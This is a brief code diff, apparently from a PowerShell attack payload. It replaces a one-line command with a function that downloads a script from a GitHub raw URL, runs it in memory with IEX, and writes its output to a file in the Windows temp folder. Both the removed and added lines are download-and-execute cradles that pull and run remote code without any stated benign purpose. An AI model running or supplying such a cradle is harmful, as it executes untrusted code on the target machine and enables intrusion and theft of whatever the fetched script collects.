@@ -1,1 +1,5 @@
-powershell IEX (New-Object Net.WebClient).DownloadString('HTTPS://GITHUB.COM/SIRPSYCHO/iNVOKE-kITTENMITTENS/RAW/MASTER/iNVOKE-kITTENMITTENS.PS1'); iNVOKE-kITTENMITTENS ^\> c:\\windows\\temp\\1.txt
+function Invoke-Start
+{
+	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/arduinotestpowershell/start/master/Kittenmittens.ps1'); 
+	Invoke-Kittenmittens > c:\windows\temp\1.txt;
+}
